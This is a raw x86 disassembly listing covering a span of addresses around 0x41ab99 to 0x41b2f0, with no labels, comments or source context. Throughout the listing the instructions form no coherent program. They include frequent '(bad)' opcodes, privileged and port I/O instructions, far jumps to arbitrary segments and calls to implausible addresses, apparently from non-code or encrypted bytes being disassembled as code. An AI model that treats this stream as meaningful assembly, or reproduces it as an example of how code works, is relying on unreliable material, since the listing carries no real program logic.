  41ab99:	es loope 0x41ab87
  41ab9c:	js     0x41abcb
  41ab9e:	xor    dl,al
  41aba0:	mov    bh,0x21
  41aba2:	mov    ah,0x93
  41aba4:	mov    dh,0x2b
  41aba6:	mov    eax,ds:0x94eab6e4
  41abab:	lods   eax,DWORD PTR ds:[esi]
  41abac:	cdq    
  41abad:	loop   0x41ab74
  41abaf:	mov    eax,ds:0x364d0551
  41abb4:	xchg   DWORD PTR [edx-0x71cc8202],esi
  41abba:	jno    0x41ab68
  41abbc:	pop    ebp
  41abbd:	cwde   
  41abbe:	jmp    0x41abd2
  41abc0:	sti    
  41abc1:	int3   
  41abc2:	sbb    BYTE PTR ds:0x2e136436,bl
  41abc8:	aas    
  41abc9:	jmp    0x6e5a:0x47849f0c
  41abd0:	sbb    ebp,DWORD PTR [ebp+0x1022ba3b]
  41abd6:	pop    es
  41abd7:	xchg   esi,eax
  41abd8:	add    ebp,DWORD PTR [esi-0x778d02ca]
  41abde:	outs   dx,DWORD PTR ds:[esi]
  41abdf:	sub    eax,0x23c82ab1
  41abe4:	jmp    0x41ac3c
  41abe6:	ins    DWORD PTR es:[edi],dx
  41abe7:	mov    BYTE PTR [esi],dh
  41abe9:	fidivr WORD PTR [eax]
  41abeb:	mov    eax,ds:0xe5cd7956
  41abf0:	and    edx,edx
  41abf2:	enter  0xa8cb,0x17
  41abf6:	sub    ah,ch
  41abf8:	ds add edi,esi
  41abfb:	mov    esi,edx
  41abfd:	sti    
  41abfe:	fistp  DWORD PTR [ebx-0x25abea7e]
  41ac04:	jmp    0x5a98:0x807feca6
  41ac0b:	jle    0x41ac0e
  41ac0d:	inc    esi
  41ac0e:	sar    BYTE PTR [ebp-0x271f1d16],1
  41ac14:	jns    0x41ac51
  41ac16:	or     al,0xbf
  41ac18:	cli    
  41ac19:	dec    esp
  41ac1a:	add    BYTE PTR [esi+edx*2+0x3edfb84b],cl
  41ac21:	daa    
  41ac22:	fwait
  41ac23:	adc    bl,cl
  41ac25:	inc    edx
  41ac26:	sti    
  41ac27:	adc    al,0xe4
  41ac29:	mov    DWORD PTR [ecx-0x6d],ebp
  41ac2c:	loopne 0x41ac84
  41ac2e:	neg    BYTE PTR [ecx]
  41ac30:	(bad)  
  41ac31:	push   edx
  41ac32:	and    eax,0x8d55aa5e
  41ac37:	(bad)  
  41ac38:	fadd   DWORD PTR [edi+eax*2-0x39]
  41ac3c:	das    
  41ac3d:	lods   eax,DWORD PTR ds:[esi]
  41ac3e:	fisub  WORD PTR [eax+0x13]
  41ac41:	hlt    
  41ac42:	stos   DWORD PTR es:[edi],eax
  41ac43:	pop    ecx
  41ac44:	imul   eax,edi,0x75293347
  41ac4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac4b:	rcl    BYTE PTR [ecx],1
  41ac4d:	push   edi
  41ac4e:	stos   BYTE PTR es:[edi],al
  41ac4f:	jae    0x41ac66
  41ac51:	jae    0x41ac63
  41ac53:	mov    cl,0x0
  41ac55:	cli    
  41ac56:	or     ch,BYTE PTR [eax+edi*4]
  41ac59:	inc    eax
  41ac5a:	pop    esp
  41ac5b:	shl    ecx,1
  41ac5d:	cs mov ch,0x95
  41ac60:	jge    0x41ac19
  41ac62:	or     BYTE PTR [edi+eiz*8],dh
  41ac65:	pop    esp
  41ac66:	clc    
  41ac67:	out    0x6a,al
  41ac69:	mov    cl,0x5
  41ac6b:	sbb    ebp,ebp
  41ac6d:	and    BYTE PTR [edi+0x611c35b7],bh
  41ac73:	dec    ecx
  41ac74:	in     al,dx
  41ac75:	sub    ecx,DWORD PTR [edi+0x6b]
  41ac78:	fld    DWORD PTR [eax-0x78]
  41ac7b:	in     al,dx
  41ac7c:	jp     0x41ac57
  41ac7e:	ds mov ah,0x15
  41ac81:	(bad)  
  41ac82:	sub    BYTE PTR [ecx+0x56],0xad
  41ac86:	mov    BYTE PTR [ebx-0x6e8a4bec],cl
  41ac8c:	mov    ds:0x9ddeda5f,al
  41ac91:	jg     0x41ad12
  41ac93:	fmul   DWORD PTR [eax]
  41ac95:	test   BYTE PTR [esi+0x587b9301],dh
  41ac9b:	xchg   ecx,eax
  41ac9c:	loopne 0x41acfc
  41ac9e:	jp     0x41ac5e
  41aca0:	push   ss
  41aca1:	imul   dh
  41aca3:	sub    DWORD PTR [ecx-0x2a],0x906ab12c
  41acaa:	pop    ds
  41acab:	sar    DWORD PTR [edx-0x2a79d515],0x0
  41acb2:	dec    eax
  41acb3:	adc    al,0x8c
  41acb5:	cs data16 je 0x41acbb
  41acb9:	pop    ss
  41acba:	gs nop
  41acbc:	(bad)  
  41acbd:	into   
  41acbe:	adc    al,BYTE PTR [edi+0x31]
  41acc1:	mov    bl,0xd5
  41acc3:	mov    bh,0x20
  41acc5:	dec    edx
  41acc6:	cmp    dl,al
  41acc8:	sbb    DWORD PTR [ecx+0x6d245067],ebp
  41acce:	aaa    
  41accf:	int3   
  41acd0:	mov    esi,0x32388e4d
  41acd5:	xor    eax,0x6a8c3a0b
  41acda:	js     0x41ad4f
  41acdc:	int3   
  41acdd:	sbb    esi,esi
  41acdf:	inc    esp
  41ace0:	lahf   
  41ace1:	(bad)  
  41ace2:	ss sti 
  41ace4:	cmp    dl,0x91
  41ace7:	fcmovnu st,st(1)
  41ace9:	loopne 0x41acd5
  41aceb:	test   al,0x76
  41aced:	adc    dl,BYTE PTR [ebp-0x47]
  41acf0:	jnp    0x41ad35
  41acf2:	cmp    ebx,DWORD PTR [edi]
  41acf4:	xor    DWORD PTR [ecx],0xffffffd4
  41acf7:	stc    
  41acf8:	cdq    
  41acf9:	inc    eax
  41acfa:	repnz mov ds:0x8f5ec77b,eax
  41ad00:	lods   al,BYTE PTR ds:[esi]
  41ad01:	in     eax,dx
  41ad02:	stc    
  41ad03:	scas   al,BYTE PTR es:[edi]
  41ad04:	pmulhw mm7,QWORD PTR [esi-0xa5fa229]
  41ad0b:	inc    esi
  41ad0c:	and    eax,0xe13041ee
  41ad11:	scas   al,BYTE PTR es:[edi]
  41ad12:	and    ecx,ecx
  41ad14:	push   ebx
  41ad15:	pop    edx
  41ad16:	loop   0x41ad2e
  41ad18:	adc    al,bh
  41ad1a:	push   0xfffffff4
  41ad1c:	cmp    DWORD PTR [ebx],ebx
  41ad1e:	dec    ebx
  41ad1f:	mov    ah,0x55
  41ad21:	pop    ecx
  41ad22:	sar    DWORD PTR [ecx],cl
  41ad24:	mov    ebp,0x49c3441d
  41ad29:	jmp    0x87cdb40a
  41ad2e:	adc    BYTE PTR [edi-0x58252b8a],dl
  41ad34:	or     DWORD PTR [edi+edi*4-0x3a],esi
  41ad38:	scas   al,BYTE PTR es:[edi]
  41ad39:	fisubr WORD PTR [ecx+edx*1]
  41ad3c:	mov    DWORD PTR [esi+eax*8-0x3c],ebx
  41ad40:	sbb    eax,0x286fc304
  41ad45:	inc    ebp
  41ad46:	mov    bl,0x31
  41ad48:	aam    0x83
  41ad4a:	fsubr  QWORD PTR [ecx-0x35b8fbd1]
  41ad50:	call   0x10fa2c04
  41ad55:	sbb    ah,ah
  41ad57:	add    al,0xd9
  41ad59:	inc    eax
  41ad5a:	mov    ch,0xff
  41ad5c:	int    0x11
  41ad5e:	test   DWORD PTR fs:[esi+eiz*8],edx
  41ad62:	jp     0x41ad37
  41ad64:	adc    edx,edx
  41ad66:	jne    0x41ad09
  41ad68:	in     eax,dx
  41ad69:	mov    cl,0x24
  41ad6b:	in     eax,dx
  41ad6c:	push   edi
  41ad6d:	ja     0x41ad1f
  41ad6f:	retf   0x3f67
  41ad72:	repnz aad 0x2
  41ad75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad76:	push   DWORD PTR [esi-0x45]
  41ad79:	pop    ebx
  41ad7a:	imul   ecx,edi,0xe27c900d
  41ad80:	dec    ecx
  41ad81:	mov    esp,0xb641202e
  41ad86:	cld    
  41ad87:	test   DWORD PTR [edx-0x43f05788],0x99bffec8
  41ad91:	loop   0x41adcd
  41ad93:	mov    bl,0xea
  41ad95:	mov    BYTE PTR [ebx],ch
  41ad97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad98:	mov    DWORD PTR [edi-0x7c896dc5],ebx
  41ad9e:	bound  ecx,QWORD PTR [eax-0x79]
  41ada1:	cwde   
  41ada2:	aam    0xe2
  41ada4:	pop    ds
  41ada5:	in     al,dx
  41ada6:	cdq    
  41ada7:	mov    WORD PTR [ebx-0x7f],fs
  41adaa:	mov    DWORD PTR [ecx],ebp
  41adac:	xchg   edi,eax
  41adad:	push   ds
  41adae:	dec    ecx
  41adaf:	mov    al,0x61
  41adb1:	jle    0x41adf3
  41adb3:	int3   
  41adb4:	ret    0x79cc
  41adb7:	sub    DWORD PTR [esi],esp
  41adb9:	push   ecx
  41adba:	test   eax,0xf17ff1d9
  41adbf:	int3   
  41adc0:	mov    cl,0x88
  41adc2:	pop    ebx
  41adc3:	gs ins DWORD PTR es:[edi],dx
  41adc5:	jb     0x41adf6
  41adc7:	dec    edi
  41adc8:	cmp    al,0xdc
  41adca:	iret   
  41adcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adcc:	aas    
  41adcd:	pop    es
  41adce:	mov    dh,0x72
  41add0:	or     ebp,DWORD PTR [eax]
  41add2:	(bad)  
  41add3:	std    
  41add4:	xchg   esi,eax
  41add5:	mov    edi,0xe796f78b
  41adda:	sar    cl,1
  41addc:	nop
  41addd:	and    DWORD PTR [ebx-0x259a7e43],ecx
  41ade3:	mov    esi,0x314a0e1b
  41ade8:	adc    BYTE PTR [ecx-0xbf6e6e],ah
  41adee:	and    cl,BYTE PTR [ecx-0x360bdde7]
  41adf4:	mov    ds:0x7a87d118,eax
  41adf9:	cmp    BYTE PTR [esi-0x50],ch
  41adfc:	(bad)  
  41adfd:	xchg   ebp,eax
  41adfe:	std    
  41adff:	lods   eax,DWORD PTR ds:[esi]
  41ae00:	pop    ebp
  41ae01:	add    DWORD PTR [ebx+0x4ca5b127],edi
  41ae07:	adc    al,0x14
  41ae09:	iret   
  41ae0a:	jno    0x41ad95
  41ae0c:	hlt    
  41ae0d:	dec    ebp
  41ae0e:	dec    esi
  41ae0f:	outs   dx,BYTE PTR ds:[esi]
  41ae10:	and    ecx,esp
  41ae12:	push   0x4e01ee75
  41ae17:	ss jns 0x41adb3
  41ae1a:	or     DWORD PTR [edi+0x53],ebx
  41ae1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae1e:	mov    edi,0x502ed9ab
  41ae23:	cmp    eax,0x51086dcd
  41ae28:	jmp    0x41ae8b
  41ae2a:	lds    eax,FWORD PTR [ebx]
  41ae2c:	enter  0x6c94,0x67
  41ae30:	jmp    0x41adf1
  41ae32:	bound  esp,QWORD PTR [ebx-0x66cbcc7d]
  41ae38:	push   ecx
  41ae39:	(bad)  
  41ae3a:	ins    DWORD PTR es:[edi],dx
  41ae3b:	fimul  WORD PTR [ebp-0x75]
  41ae3e:	(bad)  
  41ae3f:	sub    al,0x96
  41ae41:	cmc    
  41ae42:	sbb    edi,eax
  41ae44:	in     eax,0xd1
  41ae46:	jl     0x41ae49
  41ae48:	push   ecx
  41ae49:	jl     0x41ae15
  41ae4b:	ins    BYTE PTR es:[edi],dx
  41ae4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae4d:	div    eax
  41ae4f:	out    0x27,eax
  41ae51:	sub    DWORD PTR [eax+ebp*1-0x4075afa3],eax
  41ae58:	lds    ebx,FWORD PTR [ecx+0x5778160f]
  41ae5e:	ror    BYTE PTR [edx-0x6b],0x38
  41ae62:	cmc    
  41ae63:	xor    dl,ch
  41ae65:	jl     0x41ae1e
  41ae67:	out    0x8d,al
  41ae69:	rcr    DWORD PTR [ebx+0x78],1
  41ae6c:	fs jnp 0x41ae7c
  41ae6f:	das    
  41ae70:	mov    ebp,0xe974bc82
  41ae75:	ucomiss xmm2,DWORD PTR [ebx+ebp*1-0x7f200d21]
  41ae7d:	xlat   BYTE PTR ds:[ebx]
  41ae7e:	dec    edi
  41ae7f:	imul   esi,DWORD PTR [edx+0x2acedcb7],0xb160c9db
  41ae89:	(bad)  
  41ae8a:	xchg   edi,eax
  41ae8b:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae8d:	stos   DWORD PTR es:[edi],eax
  41ae8e:	icebp  
  41ae8f:	test   edx,edi
  41ae91:	adc    edi,DWORD PTR [edx]
  41ae93:	mov    esp,0xb4b3db1a
  41ae98:	mov    DWORD PTR [eax-0x5bb1df1c],esp
  41ae9e:	mov    al,ds:0xbb1058d9
  41aea3:	jno    0x41aedc
  41aea5:	mov    edx,DWORD PTR [edi+0x3c]
  41aea8:	mov    esi,DWORD PTR [ecx]
  41aeaa:	stos   BYTE PTR es:[edi],al
  41aeab:	push   ecx
  41aeac:	pop    edi
  41aead:	pop    ecx
  41aeae:	pop    esi
  41aeaf:	mov    ebx,esp
  41aeb1:	and    ah,dl
  41aeb3:	push   ebp
  41aeb4:	test   BYTE PTR ds:[ecx+0x28ed7d9d],0x84
  41aebc:	mov    eax,ds:0x5c1302c8
  41aec1:	test   BYTE PTR [ebp-0xa],bl
  41aec4:	mov    al,0x95
  41aec6:	or     DWORD PTR [ebp-0x73ea78eb],esp
  41aecc:	dec    ebp
  41aecd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aece:	mov    al,0x5b
  41aed0:	jmp    0x41af45
  41aed2:	jp     0x41aec9
  41aed4:	fwait
  41aed5:	div    DWORD PTR [edx+ebp*1-0x5b]
  41aed9:	retf   0x98cc
  41aedc:	push   edi
  41aedd:	in     eax,0x47
  41aedf:	aad    0x9f
  41aee1:	fcomi  st,st(3)
  41aee3:	jb     0x41aeac
  41aee5:	lahf   
  41aee6:	mov    bl,0x71
  41aee8:	add    DWORD PTR ss:[esi],edi
  41aeeb:	retf   0x41fa
  41aeee:	ds adc ecx,edx
  41aef1:	jge    0x41af27
  41aef3:	ins    BYTE PTR es:[edi],dx
  41aef4:	push   ebx
  41aef5:	test   al,0x3a
  41aef7:	jne    0x41af53
  41aef9:	ss fs dec ecx
  41aefc:	adc    cl,BYTE PTR [ebx+0x44]
  41aeff:	hlt    
  41af00:	std    
  41af01:	or     ebx,esp
  41af03:	dec    eax
  41af04:	repnz sbb DWORD PTR [ebp+0x10],ebp
  41af08:	fs cmp al,0x7e
  41af0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af0c:	xchg   edi,eax
  41af0d:	aas    
  41af0e:	mov    ds:0xd71b1d13,eax
  41af13:	in     eax,dx
  41af14:	pop    ecx
  41af15:	call   0xa843e934
  41af1a:	out    0xae,eax
  41af1c:	and    al,0xf2
  41af1e:	adc    bh,ah
  41af20:	clc    
  41af21:	or     al,0x5e
  41af23:	js     0x41af44
  41af25:	nop
  41af26:	jmp    0xbde1:0xc9a16148
  41af2d:	mov    ebx,0x2c173ba0
  41af32:	scas   eax,DWORD PTR es:[edi]
  41af33:	enter  0x8a9c,0xd
  41af37:	sbb    BYTE PTR [edx-0x1f],cl
  41af3a:	xchg   esp,eax
  41af3b:	or     DWORD PTR [ebx],eax
  41af3d:	mov    esp,0x5ca1e235
  41af42:	popa   
  41af43:	jae    0x41af30
  41af45:	fcmovnb st,st(1)
  41af47:	psubw  mm7,mm4
  41af4a:	xlat   BYTE PTR ds:[ebx]
  41af4b:	push   es
  41af4c:	call   0x9eb115a1
  41af51:	cmc    
  41af52:	das    
  41af53:	xchg   DWORD PTR [eax+0x4eb33394],edi
  41af59:	sar    edi,0xa1
  41af5c:	cli    
  41af5d:	icebp  
  41af5e:	inc    ebp
  41af5f:	rcl    BYTE PTR [ebp+0x57d0cb83],0x72
  41af66:	mov    ch,0x33
  41af68:	pop    ds
  41af69:	xchg   ecx,ebp
  41af6b:	test   al,0xc5
  41af6d:	in     eax,0x55
  41af6f:	jnp    0x41af51
  41af71:	and    ah,BYTE PTR [edx]
  41af73:	stc    
  41af74:	les    ebx,FWORD PTR [ecx+eax*8+0x25]
  41af78:	inc    ebx
  41af79:	scas   al,BYTE PTR es:[edi]
  41af7a:	repnz fst DWORD PTR [edx-0x2]
  41af7e:	pusha  
  41af7f:	fcom   DWORD PTR [ebx]
  41af81:	jge    0x41afdc
  41af83:	add    BYTE PTR [ebx-0x6d],0xea
  41af87:	xchg   esi,eax
  41af88:	mov    ebp,0xe09b359f
  41af8d:	repnz cmp ah,BYTE PTR [esi+ebp*8-0x72]
  41af92:	mov    esp,0x9a5a7c74
  41af97:	(bad)  
  41af98:	pop    edi
  41af99:	pop    edx
  41af9a:	jge    0x41b013
  41af9c:	fbstp  TBYTE PTR [ebp-0x37165579]
  41afa2:	add    eax,0x9905b945
  41afa7:	stos   BYTE PTR es:[edi],al
  41afa8:	aad    0x67
  41afaa:	mov    al,ds:0x63b7cf3f
  41afaf:	aad    0x9c
  41afb1:	stos   DWORD PTR es:[edi],eax
  41afb2:	mov    al,ds:0x58330f66
  41afb7:	mov    dl,BYTE PTR [ebx]
  41afb9:	ss push eax
  41afbb:	movsx  ecx,BYTE PTR [ebx+edx*8]
  41afbf:	xchg   esi,eax
  41afc0:	mov    cl,0x63
  41afc2:	jle    0x41afaf
  41afc4:	sahf   
  41afc5:	adc    ebx,edi
  41afc7:	pop    edx
  41afc8:	jno    0x41af92
  41afca:	xchg   DWORD PTR [eax],edx
  41afcc:	xchg   edx,eax
  41afcd:	cmp    BYTE PTR [edx],0x32
  41afd0:	fmul   DWORD PTR [esi]
  41afd2:	es (bad) 
  41afd4:	loope  0x41afc7
  41afd6:	and    DWORD PTR [esi],esi
  41afd8:	pop    edx
  41afd9:	jmp    FWORD PTR [ecx]
  41afdb:	cli    
  41afdc:	push   ebx
  41afdd:	jb     0x41afe7
  41afdf:	inc    ecx
  41afe0:	frstor [eax+0x34]
  41afe3:	rol    DWORD PTR [esi+0x4367039e],cl
  41afe9:	popf   
  41afea:	outs   dx,DWORD PTR ds:[esi]
  41afeb:	test   eax,0x3d0f35d5
  41aff0:	fcom   QWORD PTR [edx+0xe0bb642]
  41aff6:	popf   
  41aff7:	aas    
  41aff8:	int    0x19
  41affa:	rol    BYTE PTR [esi+0x65d78c35],0x50
  41b001:	inc    ebx
  41b002:	jle    0x41b000
  41b004:	pop    esp
  41b005:	mov    ecx,0x11eb0018
  41b00a:	adc    esp,ecx
  41b00c:	xchg   esi,eax
  41b00d:	or     BYTE PTR [edx+0x79d5a7a3],al
  41b013:	cmp    ecx,DWORD PTR [esi]
  41b015:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b016:	std    
  41b017:	ret    
  41b018:	(bad)  
  41b019:	lods   al,BYTE PTR ds:[esi]
  41b01a:	imul   esp,DWORD PTR ds:0xbc5a27de,0xffffffa6
  41b021:	mov    esp,0xea5fb636
  41b026:	mov    cl,0xcb
  41b028:	and    al,0xad
  41b02a:	sbb    BYTE PTR [ebx+0xd],dl
  41b02d:	out    dx,al
  41b02e:	dec    edx
  41b02f:	(bad)  [eax+0x6d]
  41b032:	ss add al,0x6
  41b035:	and    edi,esi
  41b037:	push   0xffffffaf
  41b039:	jbe    0x41b0b3
  41b03b:	fwait
  41b03c:	sbb    al,0x3d
  41b03e:	sbb    edi,DWORD PTR [edi-0x6b5ee7b3]
  41b044:	bound  ebx,QWORD PTR [edi]
  41b046:	out    0x40,al
  41b048:	jns    0x41b016
  41b04a:	stc    
  41b04b:	xor    al,0x8b
  41b04d:	(bad)  
  41b04f:	mov    DWORD PTR [edx],ecx
  41b051:	loop   0x41b0b7
  41b053:	inc    ecx
  41b054:	push   0xffffff8a
  41b056:	adc    BYTE PTR [eax*8+0x7862aaae],0x6d
  41b05e:	into   
  41b05f:	(bad)  
  41b060:	mov    edi,0x2995474e
  41b065:	xchg   esi,eax
  41b066:	js     0x41b060
  41b068:	add    DWORD PTR [eax-0x32d5fcc0],0xfffffffa
  41b06f:	lea    ebx,[ecx]
  41b071:	fnstenv [ecx+0x31fbfc98]
  41b077:	jp     0x41b011
  41b079:	pushf  
  41b07a:	fiadd  WORD PTR [eax+0x4642ee36]
  41b080:	rol    bl,cl
  41b082:	ds push ebp
  41b084:	imul   ebp,DWORD PTR [eax+0x5cc52339]
  41b08b:	(bad)  
  41b08c:	mov    ebp,0xf050e432
  41b091:	retf   
  41b092:	jg     0x41b087
  41b094:	xchg   ebx,eax
  41b095:	inc    eax
  41b096:	fnstsw WORD PTR [ebp+ebx*8+0x6106a53b]
  41b09d:	lea    eax,[ebp+0x18]
  41b0a0:	jnp    0x41b0d4
  41b0a2:	lock sti 
  41b0a4:	pushf  
  41b0a5:	jbe    0x41b06c
  41b0a7:	int    0xca
  41b0a9:	sbb    eax,0xaeec6e2d
  41b0ae:	push   cs
  41b0af:	aas    
  41b0b0:	pusha  
  41b0b1:	jmp    0xfc8f487a
  41b0b6:	sbb    cl,BYTE PTR [ecx+0x36200d2a]
  41b0bc:	int    0x81
  41b0be:	sub    DWORD PTR es:[ebp+0x668f158],0xd
  41b0c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0c7:	mov    ds,WORD PTR [eax+0x7c]
  41b0ca:	loopne 0x41b078
  41b0cc:	xor    dl,ch
  41b0ce:	aam    0x1
  41b0d0:	pop    edx
  41b0d1:	cmp    cl,BYTE PTR [ecx+0x11f2a4ff]
  41b0d7:	push   esp
  41b0d8:	daa    
  41b0d9:	pop    eax
  41b0da:	les    ebp,FWORD PTR [edx-0x6a]
  41b0dd:	sub    edx,eax
  41b0df:	js     0x41b092
  41b0e1:	mov    edi,0x155ed3de
  41b0e6:	add    al,0x48
  41b0e8:	jne    0x41b0d3
  41b0ea:	xor    dh,BYTE PTR [eax+0x58]
  41b0ed:	inc    edx
  41b0ee:	sbb    DWORD PTR [edx-0x574e9539],eax
  41b0f4:	mov    ch,0x5c
  41b0f6:	retf   0x23a3
  41b0f9:	adc    DWORD PTR [edi],esi
  41b0fb:	cdq    
  41b0fc:	push   ecx
  41b0fd:	xchg   edi,esi
  41b0ff:	pop    eax
  41b100:	or     al,0xfa
  41b102:	adc    DWORD PTR [ebp+edi*1-0x8],0x274f6aa6
  41b10a:	aas    
  41b10b:	test   DWORD PTR [ebp+0x5],eax
  41b10e:	out    dx,eax
  41b10f:	and    ah,BYTE PTR [ebx]
  41b111:	inc    ebx
  41b112:	sub    eax,0x5390928f
  41b117:	or     ebx,DWORD PTR [ebp+0xc]
  41b11a:	in     eax,dx
  41b11b:	test   eax,0x49d97ff1
  41b120:	cmp    al,BYTE PTR [eax+ecx*1-0x799e378]
  41b127:	clc    
  41b128:	ins    DWORD PTR es:[edi],dx
  41b129:	imul   esp,DWORD PTR [ecx+ebp*8-0x7edde21e],0x5c
  41b131:	xor    al,0x58
  41b133:	add    eax,DWORD PTR [esi+0x35]
  41b136:	stc    
  41b137:	loopne 0x41b11a
  41b139:	and    eax,0xbe9977de
  41b13e:	mov    bh,0xf3
  41b140:	push   ecx
  41b141:	jne    0x41b136
  41b143:	mov    esi,ss
  41b145:	sub    esp,DWORD PTR [ebp-0xbd86465]
  41b14b:	clc    
  41b14c:	push   edx
  41b14d:	jne    0x41b126
  41b14f:	popa   
  41b150:	sbb    cl,ah
  41b152:	jbe    0x41b156
  41b154:	adc    DWORD PTR [edi+0x67],eax
  41b157:	ret    0x9928
  41b15a:	in     eax,dx
  41b15b:	mul    DWORD PTR [ebx-0x67dc4967]
  41b161:	clc    
  41b162:	xchg   edx,eax
  41b163:	fsubr  st,st(0)
  41b165:	stos   DWORD PTR es:[edi],eax
  41b166:	jp     0x41b1b1
  41b168:	data16 or bh,BYTE PTR [esi+0x22]
  41b16c:	test   DWORD PTR [ebx+ecx*8+0x4b57e1fd],0x4656cbd7
  41b177:	(bad)  
  41b17a:	fcmovu st,st(5)
  41b17c:	popa   
  41b17d:	int    0x75
  41b17f:	lock mov ecx,ecx
  41b182:	rcl    ebp,cl
  41b184:	mov    edi,DWORD PTR [ebp+0x48755577]
  41b18a:	xor    BYTE PTR [edi+edx*2],cl
  41b18d:	adc    al,BYTE PTR ds:0x37896ae5
  41b193:	push   ecx
  41b194:	sbb    ah,ah
  41b196:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b197:	into   
  41b198:	jmp    0x41b1ec
  41b19a:	cs inc ebx
  41b19c:	iret   
  41b19d:	push   edi
  41b19e:	in     eax,0xd2
  41b1a0:	rcl    DWORD PTR [ebp-0x2a],0x78
  41b1a4:	adc    eax,DWORD PTR [edx+0x52630c9e]
  41b1aa:	sbb    cl,al
  41b1ac:	xlat   BYTE PTR ds:[ebx]
  41b1ad:	mov    ds:0x976c798e,eax
  41b1b2:	daa    
  41b1b3:	shl    edi,0xf3
  41b1b6:	xchg   BYTE PTR [ebx+0x6d586407],dl
  41b1bc:	sub    BYTE PTR [ecx],dl
  41b1be:	int    0xb5
  41b1c0:	adc    eax,0xb51b4aa9
  41b1c5:	pop    ebx
  41b1c6:	retf   0x97c2
  41b1c9:	fwait
  41b1ca:	mov    bl,0x9a
  41b1cc:	mov    dl,0x9f
  41b1ce:	pop    esp
  41b1cf:	mov    al,ds:0xbc84cb7f
  41b1d4:	inc    esi
  41b1d5:	retf   
  41b1d6:	mov    ah,0x22
  41b1d8:	repnz out dx,al
  41b1da:	ins    DWORD PTR es:[edi],dx
  41b1db:	imul   edi,DWORD PTR [ecx+0x4b9d1d01],0x57
  41b1e2:	pop    DWORD PTR [edx-0x47149603]
  41b1e8:	(bad)  
  41b1e9:	cdq    
  41b1ea:	and    bl,BYTE PTR [edi]
  41b1ec:	or     bl,cl
  41b1ee:	sbb    DWORD PTR [ebx-0x629f8912],ebx
  41b1f4:	ins    DWORD PTR es:[edi],dx
  41b1f5:	bound  esi,QWORD PTR [esi-0x4b]
  41b1f8:	push   ds
  41b1f9:	push   ebx
  41b1fa:	fucomp st(1)
  41b1fc:	fidivr WORD PTR [ecx+0x7b]
  41b1ff:	mov    eax,0x3483c836
  41b204:	enter  0xa639,0x75
  41b208:	ins    DWORD PTR es:[edi],dx
  41b209:	mov    dl,0x6c
  41b20b:	lods   eax,DWORD PTR ds:[esi]
  41b20c:	mov    edx,0x245f294
  41b211:	daa    
  41b212:	jo     0x41b1f8
  41b214:	sub    edi,DWORD PTR [edx]
  41b216:	(bad)  
  41b217:	fwait
  41b218:	dec    eax
  41b219:	les    esp,FWORD PTR [edx+0x4b73fdad]
  41b21f:	ss add eax,0x35bbadea
  41b225:	push   esi
  41b226:	xchg   ebp,eax
  41b227:	xchg   ecx,eax
  41b228:	jge    0x41b294
  41b22a:	sbb    al,0xf0
  41b22c:	cmp    al,0x9a
  41b22e:	push   ecx
  41b22f:	cmc    
  41b230:	mov    ds:0xb88a2ee2,eax
  41b235:	mov    es,esi
  41b237:	pushf  
  41b238:	sbb    dh,dh
  41b23a:	mul    BYTE PTR [ebx+0x40]
  41b23d:	mov    eax,ds:0x6718ad50
  41b242:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b243:	push   es
  41b244:	xor    DWORD PTR [edx-0x39],ebx
  41b247:	ficomp WORD PTR [eax-0x19499f23]
  41b24e:	add    bh,bl
  41b250:	loop   0x41b221
  41b252:	mov    dh,0x4d
  41b254:	jb     0x41b1db
  41b256:	dec    edx
  41b257:	adc    ecx,DWORD PTR [ebx+esi*1]
  41b25a:	xchg   ecx,eax
  41b25b:	(bad)  
  41b25c:	jnp    0x41b246
  41b25e:	sub    ch,ch
  41b260:	pop    esi
  41b261:	push   edi
  41b262:	mov    ecx,0x63cb4540
  41b267:	push   0x45
  41b269:	push   0xffffff81
  41b26b:	icebp  
  41b26c:	inc    ecx
  41b26d:	xchg   ebp,eax
  41b26e:	test   eax,0x5ec5fcfd
  41b273:	push   esp
  41b274:	cmp    BYTE PTR [edx],0xa5
  41b277:	or     eax,0x7e5932ba
  41b27c:	jmp    0xf33c:0xa5c98a40
  41b283:	adc    al,0x66
  41b285:	cmp    dh,BYTE PTR [edi+0x21475e22]
  41b28b:	lods   eax,DWORD PTR ds:[esi]
  41b28c:	cmp    edx,DWORD PTR [esp+ecx*8-0x1b]
  41b290:	outs   dx,DWORD PTR ds:[esi]
  41b291:	js     0x41b2b7
  41b293:	and    ebx,esp
  41b295:	jg     0x41b264
  41b297:	push   esi
  41b298:	aad    0xb7
  41b29a:	rol    BYTE PTR ds:0xcf2591cc,cl
  41b2a0:	adc    al,0xcf
  41b2a2:	int    0x2b
  41b2a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2a5:	fistp  QWORD PTR [ebp+edi*2+0x7a]
  41b2a9:	in     al,dx
  41b2aa:	push   0x21ccef1e
  41b2af:	rcr    BYTE PTR [edi+eax*4+0x46389d1d],0xf3
  41b2b7:	repz sub edi,eax
  41b2ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2bb:	jmp    0x41b267
  41b2bd:	out    0x61,eax
  41b2bf:	sbb    al,0x45
  41b2c1:	cmp    BYTE PTR ss:[ebp+0x759b84c],0xb2
  41b2c9:	in     eax,0xa8
  41b2cb:	js     0x41b251
  41b2cd:	add    dh,0x6f
  41b2d0:	imul   ebp,esi,0xfffffff6
  41b2d3:	arpl   WORD PTR [edx-0x55456053],cx
  41b2d9:	and    cl,BYTE PTR [esp+ecx*4+0x5]
  41b2dd:	pop    ecx
  41b2de:	out    dx,eax
  41b2df:	test   eax,0xe5fa1b0f
  41b2e4:	ss dec edx
  41b2e6:	stos   DWORD PTR es:[edi],eax
  41b2e7:	shr    BYTE PTR [esi+0x58219a4d],0x3e
  41b2ee:	pusha  
  41b2ef:	(bad)  
  41b2f0:	cmc    
